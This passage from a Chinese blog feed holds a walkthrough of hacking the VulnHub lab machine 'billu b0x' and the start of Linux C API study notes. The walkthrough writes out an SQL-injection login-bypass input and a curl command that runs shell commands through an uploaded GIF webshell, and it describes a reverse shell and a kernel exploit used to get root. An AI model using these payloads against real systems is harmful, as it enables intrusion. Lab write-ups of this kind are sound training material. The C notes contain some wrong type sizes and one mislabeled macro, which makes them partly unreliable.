        <content type="html"><![CDATA[<p><img style="margin: auto;" src="/myimages/box/vulnbox.jpg" height="500" width="500">  </p><blockquote><p> 一篇渗透学习实战记录，靶机来源于vulnhub的billu b0x。最近打算找找靶机练手，所以这是对自己在vulnhub渗透学习之路的记录，打算写上一系列，这是第一篇。</p></blockquote><a id="more"></a><h2 id="实验环境："><a href="#实验环境：" class="headerlink" title="实验环境："></a>实验环境：</h2><ul><li><p>平台: windows10 64位 VMware workstation(12.1.1 build-3770994)</p></li><li><p>网络环境：vmware里面的虚拟网卡实现一下主机的桥连，并且kali还有一张虚拟网卡实现Net连接（也就是共享主机网络模式）。二者的桥连网络地址如下：</p></li><li><p>攻击机kali（192.168.70.129）</p></li><li>靶机linux（192.168.70.128）</li></ul><p>在对环境部署好后，摩拳擦掌，跃跃欲试！</p><h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><p>先在下载地址看下靶机的基本信息，如下：<br><img src="/myimages/box/信息1.jpg" alt="image"></p><p>信息给得中规中矩，给出了服务器大致的框架PHP，Apache，MySQL(其实这些在实际的渗透中我们是不知道的，这里算是给了类似于半白盒的渗透方式了)</p><h3 id="1-信息搜集"><a href="#1-信息搜集" class="headerlink" title="1.信息搜集"></a>1.信息搜集</h3><p>靶机上线后，就是我们的渗透过程开启了。啥也不说，光是提示给的信息，我们对这台靶机的了解还是太少，第一步当然是信息收集，啥也不说，namp走一波！<br><img src="/myimages/box/nmap1.jpg" alt="image"><br>看到靶机开启了两个服务器正常开启的端口80和22。接着换参数扫一下靶机的操作系统。<br><img src="/myimages/box/nmap2.jpg" alt="image"><br>得到信息linux内核版本为3.2-4.9，这个信息返回的效果虽然不太确切，但是好歹我们知道内核版本相对比较新。如果这一步我们能够得到比较确切的版本信息，就可以比较有针对性的在后面提权中游刃有余。</p><p>大致了解了一下信息后，我们自然想到的是去访问一下网站主页，看看这是个何方神圣。<br><img src="/myimages/box/web.jpg" alt="image"></p><p>可以说这个网站也是很hacker了，这是一个比较中规中矩的post类型的sql注入框，作者都十分挑衅的说到了（show me your sqli skills）,好吧，是可忍孰不可忍，常规sql注入走一波，发现这里一般性的方法都不怎么有效。放了sqlmap跑了一没有什么效果。然后随便试了试robots.txt，也没有发现什么有价值的东西。好吧，作者你赢了！</p><p>在困境中的这个时候怎么能够不爆破一下目录呢？<code>drib</code>类似与window下的御剑之类神器，基于字典的网站目录爆破。熟练的敲下<code>drib  192.168.70.128 [big.txt]</code></p><p>Common.txt爆破的结果</p><p><img src="/myimages/box/drib1.jpg" alt="image"><br>big.txt 爆破的结果<br><img src="/myimages/box/drib2.jpg" alt="image"></p><p>有趣，一下出来这么多目录列表。这个时候当然只能够一个一个的去打开看看。这个时候莫名想起一首歌，如果你愿意一层一层的拨开……，额，走题了，其中的images目录里面是三张图，里面是勒比海盗jack和船长（估计作者在帮打广告）当然这都不重要，不是我们想要的。一一打开了这些文件，发现三个地方有点意思的：</p><h3 id="2-脆弱挖掘"><a href="#2-脆弱挖掘" class="headerlink" title="2.脆弱挖掘"></a>2.脆弱挖掘</h3><p>打开<code>http://192.168.70.128/phpmy/main</code><br><img src="/myimages/box/myadmin.jpg" alt="image"></p><p>很好，一个mysql的管理登陆界面，fuzz了一些常用的弱密码，发现无法获得登陆权限，暂且放一放。</p><p>打开<code>http://192.168.70.128/add</code>，我们发现了一个图片上传界面</p><p><img src="/myimages/box/upload.jpg" alt="image"></p><p>当我们打开到test目录的时候发现，这个网页奇迹般的回显一个错误：</p><p><img src="/myimages/box/test.jpg" alt="image"></p><h3 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3. 漏洞利用"></a>3. 漏洞利用</h3><p>这意味这啥？赤裸裸的挑衅，明摆着的文件包含漏洞？作者心也太大了吧，好，既然如此，<code>/etc/passwd</code> fuzz一波，刚开始使用的是get方法，仍旧回显错误，接着post提交了一下：<br><img src="/myimages/box/etc.jpg" alt="image">  </p><p>直接给我们返回了靶机的/etc/passwd文件内容，这说明这就是个如假包换的文件包含漏洞，到此我们找到了一个突破口，可以读取任意文件内容。好，这个时候需要静下来想想怎么利用这个漏洞。基于这个漏洞，会有个条件反射的思考，那就是读取网站的源码或者读取一些配置文件的信息。基于前面的phpmyadmin界面，我们知道mysql是通过它来管理，那么不如读一下phpmyadmin的配置文件</p><p><img src="/myimages/box/info.jpg" alt="image"></p><p>很好，不负所望的返回了用户名和密码，拿去登陆一下phpmyadmin，发现竟然登不进去，但是按照道理这地方应该就是登陆phpmyadmin的账户名和密码，难不成作者在此是为了降低难度，直接给了个ssh的密码？</p><p><img src="/myimages/box/ssh.jpg" alt="image"></p><p>果然这样我们就直接以root权限登陆进来。看下root目录和/目录下的文件：</p><p><img src="/myimages/box/root1.jpg" alt="image"></p><p>Ok,我们的渗透当然到此是完成了预期的，以root权限的登陆的目的。</p><h3 id="4-另一条路"><a href="#4-另一条路" class="headerlink" title="4.另一条路"></a>4.另一条路</h3><p>但是这或许是一种比较初级的解法，在实际的渗透过程中不太常见，当然不排除系统root用户与数据库root用户是同一个人，并且设置的密码都是一样的。这就比较幸运了。所以为了考虑实际的渗透场景，我假设自己没有知道root密码的情况下，尝试去反弹shell以及逐渐获得root权限的过程。</p><p>为了找到一些有用的信息，我们只能一步一步的从最开始的文件包含漏洞开始，争取把web的源码审计一番，看看还有没有一点可以利用的地方。这个时候想到的是那个文件上传界面，我们通过test.php的文件包含可以看到上传界面的相关源码，我们发现panel.php存在如下的代码，可以认为是对上传的文件的一个验证：</p><p><img src="/myimages/box/upload2.jpg" alt="image"></p><p>从这段代码中，我们知道对于上传上去的图片必须是以jpeg,jpg,gif,png后缀的文杰，并且后台还会检查<code>FILEINFO_MIME</code>属性，根据经验，绕过<code>FIFEINFO_MIME</code>属性检测可以直接使用构造的文件格式头，再加上我们的一句话木马即可，关键是找到可以执行我们上传的的伪图片的利用点，同样的在这个文件中，我们看到如下代码段：</p><p>发现<code>include()</code>,很好这样我们的木马就可以被执行了。</p><p><img src="/myimages/box/fileinfo_mime.jpg" alt="image"></p><p>但是问题是我们得有上传的界面，这让我想起了之前扫出来的目录add.php，但是这个从这个目录是不能够正确上传成功的。看了一下源码，发现后台并没有处理这个表单的脚本，所以可能这不是我们最终的上传界面，我们上传界面在其他地方。这个时候，再一次通过test.php的界面，打开登陆界面的源码来看，如下：</p><p>这里只是对输入单引号进行了过滤，但是通过观察思考它的查询结构以及pass语句在uname之前，所以，我们可以很容易想到一个绕过的语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Pass: \</span><br><span class="line">Username: or 1=1#</span><br></pre></td></tr></table></figure><p>这样我们就可以成功进入，然后新建一个用户，上传一个有木马的图片。登陆后的界面如下：</p><p><img src="/myimages/box/logined.jpg" alt="image"></p><h3 id="5-构造绕过FILEINFO-MIME的webshell"><a href="#5-构造绕过FILEINFO-MIME的webshell" class="headerlink" title="5.构造绕过FILEINFO_MIME的webshell"></a>5.构造绕过<code>FILEINFO_MIME</code>的<code>webshell</code></h3><p><img src="/myimages/box/webshell.jpg" alt="image">  </p><p>看到我们的小马已经准备就绪，新建一个用户直接把用户头像传入就ok啦。</p><p>接着我们就需要用到之前的penal.php部分的代码来对我们上传的文件进行利用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST --data &quot;load=../../../var/www/uploaded_images/shell.gif&amp;continue=continue&quot; http://192.168.70.128/panel.php?cmd=whoami</span><br><span class="line">--cookie  &quot;PHPSESSID=r0niu6jk5scmc3au2klbqipc12&quot;</span><br></pre></td></tr></table></figure><p>上面是我的执行代码，其中的cookie值是之前sql注入进入的penal.php的cookie值，结果返回如下：</p><p><img src="/myimages/box/wwwdata.jpg" alt="image"></p><p>图中我们可以看到自己成果执行了poc中的whoami指令，返回的结果正是我们现在获得权限的用户名，www-data。很好，这个时候其实就已经可以菜刀连接然后执行命令了。</p><p>为了体验正真的反弹shell,我打算自己用nc去实现一次回弹shell的操作。</p><h3 id="6-回弹shell和权限提升"><a href="#6-回弹shell和权限提升" class="headerlink" title="6.回弹shell和权限提升"></a>6.回弹shell和权限提升</h3><p>利用nc和python的simpleHTTPServer来进行一次别开生面的shell回弹。</p><p>攻击机新建一个文件夹，并且把nc命令copy到这个文件夹，执行python的simpleHTTPServer，让其运行在80端口方便后面靶机通过wget下载。</p><p><img src="/myimages/box/cp_nc.jpg" alt="image"></p><p>靶机调用我们之前传的木马，去远程下载这个共享的nc文件，然后进行shell的端口绑定，执行如下：</p><p><img src="/myimages/box/curl.jpg" alt="image"></p><p>然后shell端口绑定，这个地方有个坑，就是nc命令copy过去的时候在靶机是没有执行权限的，然后着实纠结了一下。（可以看到下面的文件只有读的权限）</p><p><img src="/myimages/box/nc_privilege.jpg" alt="image"></p><p>这个时候就有点尴尬，后来兜兜转转想到可以使用msf来生成shell进行回弹，这样也比较方便。就试了一下，<br>生成伪造图片shell1.gif：</p><p><img src="/myimages/box/msfshell.jpg" alt="image"></p><p>然后注册新用户上传,在本机打开msf控制台</p><p><img src="/myimages/box/runmsf.jpg" alt="image"></p><p>执行文件包含漏洞的命令：</p><p><img src="/myimages/box/curl2.jpg" alt="image"></p><p>然后可以看到我们的shell回弹成功了，然后执行sysinfo，查看当前内核版本。还记得我们开始的时候有说过，uname -a 查看的内核版本是可以方便后面的提权，这里就很好的体现了出来，那么得出了系统的内核版本后，就可以去针对性的搜索一些可用的提权方案，这里找到了网上exploit_db的一个针对该版本的内核漏洞。通过下载c文件，gcc编译后，我们就可以以root用户权限了。</p><p><img src="/myimages/box/pwn.jpg" alt="image"></p><h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><p>总的来说这是一个愉快的渗透体验，当然这个过程也参考了前辈的经验。整个流程做下来还是比较舒服，渗透思路还是相当的清晰的。anyhow 也算是走了一遍流程。当然渗透是个博大精深的学问，这个实验只是包括了大致的信息搜集漏洞扫描到webshell和提权的过程，囊括了一些渗透的细节，不过在内网穿透和域的横向渗透上的能力还没有很好的模拟出环境，这题是默认我们已经和靶机在同一个局域网，还是有一点偏离实际，以后要自己搭搭内网渗透的实验环境来学习，ok,鸣金收兵！</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> linux </tag>
            
            <tag> 渗透 </tag>
            
            <tag> 提权 </tag>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>linux C API 笔记</title>
      <link href="/2018/06/25/linux-C-API-%E7%AC%94%E8%AE%B0/"/>
      <url>/2018/06/25/linux-C-API-%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p><img style="margin: auto;" src="/myimages/linux_c_api/index.png" height="400" width="400">  </p><blockquote><p>linuxc编程的应用范围比较广，最近学习操作系统，把上机和可编程中用到的一些函数API做一些笔记和摘录，方便日后复习。上机的相关代码在:<a href="https://github.com/IversionBY/linux_systemlearning_c_programe/" target="_blank" rel="noopener">https://github.com/IversionBY/linux_systemlearning_c_programe/</a></p></blockquote><a id="more"></a><h1 id="温故而知新"><a href="#温故而知新" class="headerlink" title="温故而知新"></a>温故而知新</h1><ul><li><a href="http://blog.51cto.com/ssspure/1694224" target="_blank" rel="noopener">关于c语言指针的文章，写得很不错</a>  </li><li>C语言各个数据类型占用的地址位<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">char：1字节</span><br><span class="line"></span><br><span class="line">int：2字节</span><br><span class="line"></span><br><span class="line">short int：2字节</span><br><span class="line"></span><br><span class="line">long int：4字节</span><br><span class="line"></span><br><span class="line">unsigned: 2字节</span><br><span class="line"></span><br><span class="line">unsigned long：4字节</span><br><span class="line"></span><br><span class="line">float：4字节</span><br><span class="line"></span><br><span class="line">double：8字节</span><br></pre></td></tr></table></figure></li></ul><h1 id="函数API"><a href="#函数API" class="headerlink" title="函数API"></a>函数API</h1><ul><li><h3 id="basename"><a href="#basename" class="headerlink" title="basename()"></a><code>basename()</code></h3><p>实现对文件名的获取</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;libgen.h&gt;   </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">basename</span><span class="params">(<span class="keyword">char</span> *path)</span></span>;</span><br><span class="line"><span class="comment">//参数是文件的路径</span></span><br><span class="line"><span class="comment">//返回值是一个字符串类型，即文件名</span></span><br></pre></td></tr></table></figure></li><li><h3 id="stat-lstat-fstat"><a href="#stat-lstat-fstat" class="headerlink" title="stat() lstat() fstat()"></a><code>stat()</code> <code>lstat()</code> <code>fstat()</code></h3><p>返回一个文件的基本信息，包括文件的大小，文件类型等，操作系统上机题目中用到的是目录的判定，最常用的结构体成员是<code>st_mode</code>。与其相类似的是<code>lstat()</code>,<code>fstat()</code>功能和<code>stat()</code>差不多。fstat区别于另外两个系统调用的地方在于，<code>fstat</code>系统调用接受的是一个“文件描述符”（进程通过open系统调用返回的文件描述符，int类型。），而另外两个则直接接受“文件全路径”。<code>stat</code>和<code>lstat</code>的区别：当文件是一个符号链接时，<code>lstat</code>返回的是该符号链接本身的信息；而<code>stat</code>返回的是该链接指向的文件的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">stat</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> * file_name, struct stat *buf)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fstat</span><span class="params">(<span class="keyword">int</span> filedes, struct stat *buf)</span></span>; </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lstat</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path, struct stat *buf)</span></span>; </span><br><span class="line"><span class="comment">/*参数解释</span></span><br><span class="line"><span class="comment">path：文件路径名。 </span></span><br><span class="line"><span class="comment">filedes：文件描述词。 </span></span><br><span class="line"><span class="comment">buf：保存文件信息的结构体 </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//执行成功则返回0，失败返回-1，错误代码存于errno</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*错误代码</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">ENOENT         参数file_name指定的文件不存在</span></span><br><span class="line"><span class="comment">ENOTDIR        路径中的目录存在但却非真正的目</span></span><br><span class="line"><span class="comment">ELOOP          欲打开的文件有过多符号连接问题，上限为16符号连接</span></span><br><span class="line"><span class="comment"> EFAULT         参数buf为无效指针，指向无法存在的内存空间</span></span><br><span class="line"><span class="comment">EACCESS        存取文件时被拒绝</span></span><br><span class="line"><span class="comment">ENOMEM         核心内存不足</span></span><br><span class="line"><span class="comment">ENAMETOOLONG   参数file_name的路径名称太长数值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*结构体定义</span></span><br><span class="line"><span class="comment">struct stat</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    dev_t st_dev; //device 文件的设备编号</span></span><br><span class="line"><span class="comment">    ino_t st_ino; //inode 文件的i-node</span></span><br><span class="line"><span class="comment">    mode_t st_mode; //protection 文件的类型和存取的权限</span></span><br><span class="line"><span class="comment">    nlink_t st_nlink; //number of hard links 连到该文件的硬连接数目, 刚建立的文件值为1.</span></span><br><span class="line"><span class="comment">    uid_t st_uid; //user ID of owner 文件所有者的用户识别码</span></span><br><span class="line"><span class="comment">    gid_t st_gid; //group ID of owner 文件所有者的组识别码</span></span><br><span class="line"><span class="comment">    dev_t st_rdev; //device type 若此文件为装置设备文件, 则为其设备编号</span></span><br><span class="line"><span class="comment">    off_t st_size; //total size, in bytes 文件大小, 以字节计算</span></span><br><span class="line"><span class="comment">    unsigned long st_blksize; //blocksize for filesystem I/O 文件系统的I/O 缓冲区大小.</span></span><br><span class="line"><span class="comment">    unsigned long st_blocks; //number of blocks allocated 占用文件区块的个数, 每一区块大小为512 个字节.</span></span><br><span class="line"><span class="comment">    time_t st_atime; //time of lastaccess 文件最近一次被存取或被执行的时间, 一般只有在用mknod、utime、read、write 与tructate 时改变.</span></span><br><span class="line"><span class="comment">    time_t st_mtime; //time of last modification 文件最后一次被修改的时间, 一般只有在用mknod、utime 和write 时才会改变</span></span><br><span class="line"><span class="comment">    time_t st_ctime; //time of last change i-node 最近一次被更改的时间, 此参数会在文件所有者、组、权限被更改时更新</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*st_mode的类型标识</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">S_IFMT   0170000    文件类型的位遮罩  </span></span><br><span class="line"><span class="comment">S_IFSOCK 0140000    scoket  </span></span><br><span class="line"><span class="comment">S_IFLNK 0120000     符号连接  </span></span><br><span class="line"><span class="comment">S_IFREG 0100000     一般文件  </span></span><br><span class="line"><span class="comment">S_IFBLK 0060000     区块装置  </span></span><br><span class="line"><span class="comment">S_IFDIR 0040000     目录  </span></span><br><span class="line"><span class="comment">S_IFCHR 0020000     字符装置  </span></span><br><span class="line"><span class="comment">S_IFIFO 0010000     先进先出  </span></span><br><span class="line"><span class="comment">S_ISUID 04000     文件的(set user-id on execution)位  </span></span><br><span class="line"><span class="comment">S_ISGID 02000     文件的(set group-id on execution)位  </span></span><br><span class="line"><span class="comment">S_ISVTX 01000     文件的sticky位  </span></span><br><span class="line"><span class="comment">S_IRUSR(S_IREAD) 00400     文件所有者具可读取权限  </span></span><br><span class="line"><span class="comment">S_IWUSR(S_IWRITE)00200     文件所有者具可写入权限  </span></span><br><span class="line"><span class="comment">S_IXUSR(S_IEXEC) 00100     文件所有者具可执行权限  </span></span><br><span class="line"><span class="comment">S_IRGRP 00040             用户组具可读取权限  </span></span><br><span class="line"><span class="comment">S_IWGRP 00020             用户组具可写入权限  </span></span><br><span class="line"><span class="comment">S_IXGRP 00010             用户组具可执行权限  </span></span><br><span class="line"><span class="comment">S_IROTH 00004             其他用户具可读取权限  </span></span><br><span class="line"><span class="comment">S_IWOTH 00002             其他用户具可写入权限  </span></span><br><span class="line"><span class="comment">S_IXOTH 00001             其他用户具可执行权限  </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*linux中检查上述st_mode成员类型的宏定义函数</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">S_ISLNK(st_mode)    判断是否为符号连接  </span></span><br><span class="line"><span class="comment">S_ISREG(st_mode)    是否为一般文件  </span></span><br><span class="line"><span class="comment">S_ISDIR(st_mode)    是否为目录  </span></span><br><span class="line"><span class="comment">S_ISCHR(st_mode)    是否为字符三设备文件  </span></span><br><span class="line"><span class="comment">S_ISBLK(st_mode)    是否为先进先出  </span></span><br><span class="line"><span class="comment">S_ISSOCK(st_mode)   是否为socket  </span></span><br><span class="line"><span class="comment">S_ISUID(st_mode)    文件设置了SUID位</span></span><br><span class="line"><span class="comment">S_ISGID(st_mode)    文件设置了SGID位</span></span><br><span class="line"><span class="comment">S_ISVTX(st_mode)    文件设置了sticky位</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></li><li><h3 id="open"><a href="#open" class="headerlink" title="open()"></a><code>open()</code></h3><p>打开一个文件，可以指定打开的flag和权限</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">open</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> * pathname, <span class="keyword">int</span> flags, <span class="keyword">mode_t</span> mode)</span></span>;</span><br><span class="line"><span class="comment">/*参数解释</span></span><br><span class="line"><span class="comment">pathname:需要打开的文件路径</span></span><br><span class="line"><span class="comment">flags:打开的标志位</span></span><br><span class="line"><span class="comment">mode:打开的权限方式</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//返回值：正确返回打开的文件句柄，打开失败返回-1，注意返回的句柄默认从整数3开始。其中标识符`0，1，2`分别被`标准输入`，`标准输出`，`标准错误输出`占用。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*flags</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">O_RDONLY 以只读方式打开文件</span></span><br><span class="line"><span class="comment">O_WRONLY 以只写方式打开文件</span></span><br><span class="line"><span class="comment">O_RDWR 以可读写方式打开文件. 上述三种旗标是互斥的, 也就是不可同时使用, 但可与下列的旗标利用OR(|)运算符组合.</span></span><br><span class="line"><span class="comment">O_CREAT 若欲打开的文件不存在则自动建立该文件.</span></span><br><span class="line"><span class="comment">O_EXCL 如果O_CREAT 也被设置, 此指令会去检查文件是否存在. 文件若不存在则建立该文件, 否则将导致打开文件错误. 此外, 若O_CREAT 与O_EXCL 同时设置, 并且欲打开的文件为符号连接, 则会打开文件失败.</span></span><br><span class="line"><span class="comment">O_NOCTTY 如果欲打开的文件为终端机设备时, 则不会将该终端机当成进程控制终端机.</span></span><br><span class="line"><span class="comment">O_TRUNC 若文件存在并且以可写的方式打开时, 此旗标会令文件长度清为0, 而原来存于该文件的资料也会消失.</span></span><br><span class="line"><span class="comment">O_APPEND 当读写文件时会从文件尾开始移动, 也就是所写入的数据会以附加的方式加入到文件后面.</span></span><br><span class="line"><span class="comment">O_NONBLOCK 以不可阻断的方式打开文件, 也就是无论有无数据读取或等待, 都会立即返回进程之中.</span></span><br><span class="line"><span class="comment">O_NDELAY 同O_NONBLOCK.</span></span><br><span class="line"><span class="comment">O_SYNC 以同步的方式打开文件.</span></span><br><span class="line"><span class="comment">O_NOFOLLOW 如果参数pathname 所指的文件为一符号连接, 则会令打开文件失败.</span></span><br><span class="line"><span class="comment">O_DIRECTORY 如果参数pathname 所指的文件并非为一目录, 则会令打开文件失败</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*mode</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">S_IRWXU00700 权限, 代表该文件所有者具有可读、可写及可执行的权限.</span></span><br><span class="line"><span class="comment">S_IRUSR 或S_IREAD, 00400 权限, 代表该文件所有者具有可读取的权限.</span></span><br><span class="line"><span class="comment">S_IWUSR 或S_IWRITE, 00200 权限, 代表该文件所有者具有可写入的权限.</span></span><br><span class="line"><span class="comment">S_IXUSR 或S_IEXEC, 00100 权限, 代表该文件所有者具有可执行的权限.</span></span><br><span class="line"><span class="comment">S_IRWXG 00070 权限, 代表该文件用户组具有可读、可写及可执行的权限.</span></span><br><span class="line"><span class="comment">S_IRGRP 00040 权限, 代表该文件用户组具有可读的权限.</span></span><br><span class="line"><span class="comment">S_IWGRP 00020 权限, 代表该文件用户组具有可写入的权限.</span></span><br><span class="line"><span class="comment">S_IXGRP 00010 权限, 代表该文件用户组具有可执行的权限.</span></span><br><span class="line"><span class="comment">S_IRWXO 00007 权限, 代表其他用户具有可读、可写及可执行的权限.</span></span><br><span class="line"><span class="comment">S_IROTH 00004 权限, 代表其他用户具有可读的权限</span></span><br><span class="line"><span class="comment">S_IWOTH 00002 权限, 代表其他用户具有可写入的权限.</span></span><br><span class="line"><span class="comment">S_IXOTH 00001 权限, 代表其他用户具有可执行的权限.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></li><li><h3 id="access"><a href="#access" class="headerlink" title="access()"></a><code>access()</code></h3><p>检查调用进程是否可以对指定的文件执行某种操作，也可以判断一个文件是否存在。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">access</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *pathname, <span class="keyword">int</span> mode)</span></span>;</span><br><span class="line"><span class="comment">/*参数</span></span><br><span class="line"><span class="comment">pathname: 需要测试的文件路径名。   </span></span><br><span class="line"><span class="comment">mode: 需要测试的操作模式</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//返回：成功执行时，返回0。失败返回-1。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*error 类型</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">成功执行时，返回0。失败返回-1，errno被设为以下的某个值 </span></span><br><span class="line"><span class="comment">EINVAL： 模式值无效   </span></span><br><span class="line"><span class="comment">EACCES： 文件或路径名中包含的目录不可访问 </span></span><br><span class="line"><span class="comment">ELOOP ： 解释路径名过程中存在太多的符号连接 